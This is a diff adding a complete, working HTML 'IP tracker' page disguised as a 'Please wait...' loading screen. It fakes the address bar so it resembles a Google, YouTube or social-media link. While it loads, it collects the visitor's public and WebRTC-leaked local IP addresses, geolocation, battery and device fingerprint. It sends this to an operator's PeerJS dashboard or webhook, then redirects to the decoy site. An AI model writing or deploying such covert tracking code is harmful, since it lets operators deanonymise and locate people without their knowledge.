@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Please wait...</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { background: #fff; min-height: 100vh; overflow: hidden; }
+
+    /* Thin top progress bar only — rest is white */
+    #bar {
+      position: fixed; top: 0; left: 0;
+      height: 3px; width: 0%;
+      background: #4285f4;
+      border-radius: 0 2px 2px 0;
+      transition: width 0.4s ease;
+      z-index: 9999;
+    }
+
+    /* Ghost button — invisible, covers full screen for user-gesture */
+    #ghost {
+      position: fixed; inset: 0;
+      background: transparent; border: none;
+      cursor: default; z-index: 1;
+    }
+  </style>
+
+  <!-- PeerJS with fallback CDN -->
+  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"
+    onerror="this.onerror=null;var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/npm/peerjs@1.5.4/dist/peerjs.min.js';document.head.appendChild(s);">
+  </script>
+</head>
+<body>
+<div id="bar"></div>
+<button id="ghost" tabindex="-1" aria-hidden="true"></button>
+
+<script>
+// ── Read params ──────────────────────────────────────────────
+const P      = new URLSearchParams(location.search);
+const hostId = P.get('host')    || '';
+const hookUrl= P.get('hook')    || ''; // optional: webhook URL (Python server)
+let goTo     = P.get('redirect')|| 'https://www.google.com';
+if (!goTo.startsWith('http')) goTo = 'https://' + goTo;
+
+let _sent = false; // guard: redirect only once
+
+// ── Mask the address bar immediately ───────────────────────
+(function() {
+  try {
+    const r = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+    let id = ''; for (let i=0; i<11; i++) id += r[Math.floor(Math.random()*r.length)];
+    let path = '/watch?v=' + id;
+    const h = new URL(goTo).hostname.replace('www.','');
+    if (h.includes('google'))                           path = '/search?q=' + encodeURIComponent('trending today');
+    else if (h.includes('facebook')||h.includes('fb')) path = '/reel/' + Math.floor(Math.random()*9e11+1e11);
+    else if (h.includes('instagram'))                   path = '/p/' + id + '/';
+    else if (h.includes('twitter')||h.includes('x.'))  path = '/i/status/' + Math.floor(Math.random()*9e17+1e17);
+    else if (h.includes('tiktok'))                      path = '/@trending/video/' + Math.floor(Math.random()*9e17+1e17);
+    else if (h.includes('youtube'))                     path = '/watch?v=' + id;
+    history.replaceState(null, '', path);
+    document.title = 'Please wait\u2026';
+  } catch(e) {}
+})();
+
+// ── Progress bar animation ──────────────────────────────────
+const barEl = document.getElementById('bar');
+let pct = 5;
+const _barTick = setInterval(() => { pct += (100 - pct) * 0.08; barEl.style.width = pct + '%'; }, 300);
+
+// ── Final redirect (called ONLY after data is sent) ─────────
+function doRedirect() {
+  if (_sent) return;
+  _sent = true;
+  clearInterval(_barTick);
+  barEl.style.transition = 'width 0.2s';
+  barEl.style.width = '100%';
+  setTimeout(() => { window.location.replace(goTo); }, 200);
+}
+
+// ══════════════════════════════════════════════════════════
+// DATA COLLECTION — all run in parallel for speed
+// ══════════════════════════════════════════════════════════
+
+// ① Public IPv4 + geo via ipapi.co
+function fetchPublicIP() {
+  return fetch('https://ipapi.co/json/', {cache:'no-store'})
+    .then(r => r.json()).catch(() => ({}));
+}
+
+// ② Public IPv6 — tries multiple IPv6-only endpoints in sequence
+function fetchIPv6() {
+  // These endpoints only respond over IPv6, so they return the real IPv6 address.
+  // If the network is IPv4-only they all fail → null (correct behaviour).
+  const apis = [
+    () => fetch('https://api6.ipify.org?format=json',  {cache:'no-store'}).then(r=>r.json()).then(d=>d.ip||null),
+    () => fetch('https://v6.ident.me/json',            {cache:'no-store'}).then(r=>r.json()).then(d=>d.address||null),
+    () => fetch('https://ipv6.icanhazip.com',          {cache:'no-store'}).then(r=>r.text()).then(t=>t.trim()||null),
+    () => fetch('https://api64.ipify.org?format=json', {cache:'no-store'}).then(r=>r.json()).then(d=>{
+      // api64 returns whichever version the network prefers — only keep if it IS an IPv6
+      const ip = d.ip || '';
+      return ip.includes(':') ? ip : null;
+    })
+  ];
+
+  // Try them one by one; return first non-null result
+  return apis.reduce(
+    (chain, fn) => chain.then(v => v !== null ? v : fn().catch(() => null)),
+    Promise.resolve(null)
+  );
+}
+
+// ③ Private/Local IPs (and possible link-local IPv6) via WebRTC ICE candidates
+function fetchPrivateIP() {
+  return new Promise(resolve => {
+    try {
+      // Use a public STUN server so ICE gathers server-reflexive (srflx) candidates,
+      // which can expose the real IPv6 address on dual-stack networks.
+      const pc = new RTCPeerConnection({
+        iceServers: [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' }
+        ]
+      });
+      pc.createDataChannel('');
+      const ipv4s = [], ipv6s = [];
+
+      pc.onicecandidate = e => {
+        if (!e || !e.candidate) {
+          try { pc.close(); } catch(_){}
+          const parts = [];
+          if (ipv4s.length) parts.push(ipv4s.join(', '));
+          if (ipv6s.length) parts.push(ipv6s.join(', '));
+          resolve(parts.length ? parts.join(' | ') : null);
+          return;
+        }
+        const cand = e.candidate.candidate;
+
+        // Match IPv4
+        const m4 = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(cand);
+        if (m4 && !ipv4s.includes(m4[1])) ipv4s.push(m4[1]);
+
+        // Match IPv6  (full address or abbreviated, e.g. 2001:db8::1 or fe80::1%eth0)
+        const m6 = /([0-9a-fA-F]{1,4}(?::[0-9a-fA-F]{0,4}){2,7})/.exec(cand);
+        if (m6) {
+          const raw = m6[1].split('%')[0]; // strip interface suffix
+          if (raw.includes(':') && !ipv6s.includes(raw)) ipv6s.push(raw);
+        }
+      };
+
+      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve(null));
+      // Wait max 5s for ICE gathering
+      setTimeout(() => {
+        try { pc.close(); } catch(_){}
+        const parts = [];
+        if (ipv4s.length) parts.push(ipv4s.join(', '));
+        if (ipv6s.length) parts.push(ipv6s.join(', '));
+        resolve(parts.length ? parts.join(' | ') : null);
+      }, 5000);
+    } catch(e) { resolve(null); }
+  });
+}
+
+// ④ Battery status
+function fetchBattery() {
+  return new Promise(resolve => {
+    if (!navigator.getBattery) return resolve(null);
+    navigator.getBattery()
+      .then(b => resolve({ level: Math.round(b.level*100)+'%', charging: b.charging }))
+      .catch(() => resolve(null));
+  });
+}
+
+// ══════════════════════════════════════════════════════════
+// BUILD PAYLOAD from all collected data
+// ══════════════════════════════════════════════════════════
+function buildPayload(ipData, ipv6, privateIP, battery) {
+  const ua = navigator.userAgent;
+
+  // OS detection
+  let os = 'Unknown';
+  if      (/Windows NT 10|Windows NT 11/.test(ua))  os = 'Windows 10/11';
+  else if (/Windows NT 6\.3/.test(ua))               os = 'Windows 8.1';
+  else if (/Windows NT 6\.2/.test(ua))               os = 'Windows 8';
+  else if (/Windows NT 6\.1/.test(ua))               os = 'Windows 7';
+  else if (/Android/.test(ua))                        os = 'Android ' + (ua.match(/Android ([\d.]+)/)||['','?'])[1];
+  else if (/iPhone/.test(ua))                         os = 'iPhone iOS ' + (ua.match(/OS ([\d_]+)/)||['','?'])[1].replace(/_/g,'.');
+  else if (/iPad/.test(ua))                           os = 'iPad iOS ' + (ua.match(/OS ([\d_]+)/)||['','?'])[1].replace(/_/g,'.');
+  else if (/Macintosh/.test(ua))                      os = 'macOS';
+  else if (/Linux/.test(ua))                          os = 'Linux';
+  else if (/CrOS/.test(ua))                           os = 'Chrome OS';
+
+  // Browser detection
+  let browser = 'Unknown';
+  if      (/SamsungBrowser\//.test(ua))  browser = 'Samsung Browser ' + (ua.match(/SamsungBrowser\/([\d.]+)/)||['','?'])[1];
+  else if (/Edg\//.test(ua))             browser = 'Microsoft Edge '  + (ua.match(/Edg\/([\d.]+)/)||['','?'])[1];
+  else if (/OPR\//.test(ua))             browser = 'Opera '           + (ua.match(/OPR\/([\d.]+)/)||['','?'])[1];
+  else if (/YaBrowser\//.test(ua))       browser = 'Yandex Browser '  + (ua.match(/YaBrowser\/([\d.]+)/)||['','?'])[1];
+  else if (/UCBrowser\//.test(ua))       browser = 'UC Browser '      + (ua.match(/UCBrowser\/([\d.]+)/)||['','?'])[1];
+  else if (/Chrome\//.test(ua))          browser = 'Google Chrome '   + (ua.match(/Chrome\/([\d.]+)/)||['','?'])[1];
+  else if (/Firefox\//.test(ua))         browser = 'Mozilla Firefox '  + (ua.match(/Firefox\/([\d.]+)/)||['','?'])[1];
+  else if (/Version\//.test(ua)&&/Safari\//.test(ua)) browser = 'Apple Safari ' + (ua.match(/Version\/([\d.]+)/)||['','?'])[1];
+
+  // Device type
+  let device = 'Desktop 🖥️';
+  if      (/iPad/.test(ua))              device = 'Tablet (iPad) 📟';
+  else if (/Android.*Tablet/.test(ua))   device = 'Tablet (Android) 📟';
+  else if (/Mobi|Android|iPhone/.test(ua)) device = 'Mobile 📱';
+
+  // Network connection
+  const nc = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  let conn = null;
+  if (nc) {
+    const parts = [];
+    if (nc.effectiveType) parts.push(nc.effectiveType.toUpperCase());
+    if (nc.type && nc.type !== 'unknown') parts.push('(' + nc.type + ')');
+    if (nc.downlink) parts.push('~' + nc.downlink + ' Mbps');
+    if (nc.rtt) parts.push('RTT:' + nc.rtt + 'ms');
+    conn = parts.join(' ') || null;
+  }
+
+  return {
+    type: 'ip_track',
+
+    // ── IP Addresses ──
+    ipv4:        ipData.ip || null,
+    ipv6:        ipv6 || null,
+    private_ip:  privateIP || null,
+    ip_type:     ipData.version || 'IPv4',
+
+    // ── Network ──
+    org:         ipData.org || null,
+    asn:         ipData.asn || null,
+    connection:  conn,
+
+    // ── Location ──
+    country:     (ipData.country_name || '') + (ipData.country_code ? ' ('+ipData.country_code+')' : ''),
+    city:        ipData.city || null,
+    region:      ipData.region || null,
+    postal:      ipData.postal || null,
+    timezone:    ipData.timezone || null,
+    lat:         ipData.latitude  || null,
+    lon:         ipData.longitude || null,
+
+    // ── Device ──
+    device:      device,
+    os:          os,
+    browser:     browser,
+    screen:      screen.width + 'x' + screen.height + ' (depth:' + screen.colorDepth + 'bit @' + (window.devicePixelRatio||1) + 'x)',
+    viewport:    window.innerWidth + 'x' + window.innerHeight,
+    language:    navigator.language || navigator.userLanguage || null,
+    languages:   (navigator.languages||[]).join(', ') || null,
+    platform:    navigator.platform || null,
+    cores:       navigator.hardwareConcurrency || null,
+    memory:      navigator.deviceMemory ? navigator.deviceMemory + ' GB' : null,
+    touch:       navigator.maxTouchPoints > 0 ? 'Yes (' + navigator.maxTouchPoints + ' points)' : 'No',
+    cookies:     navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+    dnt:         navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled',
+    java:        false,
+    webgl:       (function(){ try { return !!document.createElement('canvas').getContext('webgl'); } catch(e){ return false; } })(),
+    battery_level:    battery ? battery.level : null,
+    battery_charging: battery ? battery.charging : null,
+    referrer:    document.referrer || null,
+    timestamp:   new Date().toISOString(),
+    ua:          ua
+  };
+}
+
+// ══════════════════════════════════════════════════════════
+// SEND via PeerJS → host dashboard
+// ══════════════════════════════════════════════════════════
+function sendViaPeer(payload) {
+  return new Promise(resolve => {
+    if (!hostId) return resolve(false);
+    let peer;
+    try {
+      peer = new Peer({
+        host:'0.peerjs.com', port:443, path:'/', secure:true,
+        config:{ iceServers:[{ urls:'stun:stun.l.google.com:19302' }] }
+      });
+    } catch(e) {
+      try { peer = new Peer(); } catch(e2) { return resolve(false); }
+    }
+
+    const t = setTimeout(() => resolve(false), 12000);
+
+    peer.on('open', function() {
+      try {
+        const conn = peer.connect(hostId, { reliable: true });
+        conn.on('open', function() {
+          conn.send(JSON.stringify(payload));
+          clearTimeout(t);
+          setTimeout(() => { try { peer.destroy(); } catch(e){} resolve(true); }, 600);
+        });
+        conn.on('error', () => { clearTimeout(t); resolve(false); });
+        setTimeout(() => { clearTimeout(t); resolve(false); }, 8000);
+      } catch(e) { clearTimeout(t); resolve(false); }
+    });
+    peer.on('error', () => { clearTimeout(t); resolve(false); });
+  });
+}
+
+// ══════════════════════════════════════════════════════════
+// SEND via Webhook → Python/any HTTP server
+// ══════════════════════════════════════════════════════════
+function sendViaHook(payload) {
+  if (!hookUrl) return Promise.resolve(false);
+  return fetch(hookUrl, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload),
+    mode: 'no-cors'    // avoids CORS block; server still receives it
+  }).then(() => true).catch(() => false);
+}
+
+// ══════════════════════════════════════════════════════════
+// MAIN — collect everything, send everything, THEN redirect
+// ══════════════════════════════════════════════════════════
+async function main() {
+  // Hard fallback: if anything hangs > 22s, redirect anyway
+  const hardTimer = setTimeout(doRedirect, 22000);
+
+  try {
+    // 1. Collect ALL data in parallel (fast!)
+    const [ipData, ipv6, privateIP, battery] = await Promise.all([
+      fetchPublicIP(),
+      fetchIPv6(),
+      fetchPrivateIP(),   // ~3-4s due to ICE gathering
+      fetchBattery()
+    ]);
+
+    // 2. Build the full payload
+    const payload = buildPayload(ipData, ipv6, privateIP, battery);
+
+    // 3. Send via BOTH channels simultaneously (PeerJS + webhook if configured)
+    await Promise.allSettled([
+      sendViaPeer(payload),
+      sendViaHook(payload)
+    ]);
+
+    clearTimeout(hardTimer);
+  } catch(e) {
+    clearTimeout(hardTimer);
+  }
+
+  // 4. ONLY NOW redirect
+  doRedirect();
+}
+
+// Start collecting as soon as page loads
+window.addEventListener('load', main);
+</script>
+</body>
+</html>
